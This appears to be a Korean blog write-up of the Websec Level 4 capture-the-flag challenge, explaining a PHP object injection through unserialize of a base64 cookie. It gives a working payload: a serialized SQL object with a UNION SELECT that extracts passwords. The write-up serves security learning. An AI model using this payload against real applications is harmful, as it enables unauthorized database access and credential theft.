---
title : "Websec - Level 4"
excerpt : "Websec - Level 4"
toc : true
toc_sticky : true
categories :
  - Websec
tags :
  - PHP object injection
---

## 1. Source code
```php
$sql = new SQL();
$sql->query = 'SELECT username FROM users WHERE id=';
if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
```
SQL 클래스의 소멸자 
```php
public function execute() {
        return $this->conn->query ($this->query);
    }

public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>'; # 이 부분 잊지 말기. 잊으면 바보같이 뻘짓함.
            }
        }
    }
```

## 2. Vulnerability

이 문제는 unserialize 함수를 이용한 **PHP object injection** 문제다.  
자세한 내용은 [PHP Object Injection](https://blog.do9.kr/150)  
**unserialize** 함수는 serialize된 문자열을 PHP 값으로 반환해주는 함수다.  
자세한 내용은 [PHP Serialize/Unserialize](http://chongmoa.com/php/6902)

코드를 보면 base64인코딩 된 쿠키 값을 디코딩 한 후 unserialize해서 변수에 담는다. **그 다음 주목할 부분은 try catch 구문이다.**
sess_data 변수 값이 배열이 아니라면 catch 구문으로 이동을 하고 예외상황을 출력한다. 이 부분이 unserialize 함수를 이용한 취약점이 터지는 곳이다.

## 3. Solution

쿠키 값에 SQL 객체를 serialize한 뒤 base64 인코딩 한 값을 줘야 한다. 
우선 플래그를 보려면 SQL 객체의 query 변수 값은 이렇게 되어야 한다.  
```select username from users where id=1 union select password from users where id=1```  
SQL 객체를 serialize를 해주면 이렇게 된다.  
```O:3:"SQL":1:{s:5:"query";s:81:"select username from users where id=1 union select password from users where id=1";}```  
이 문자열을 base64인코딩 해줘서 쿠키값으로 주면 catch 구문에서 sess_data 값을 출력을 해주므로 SQL 객체를 실행시켜서 소멸자에서 query를 실행시켜서 username에 플래그 값이 나온다.
 
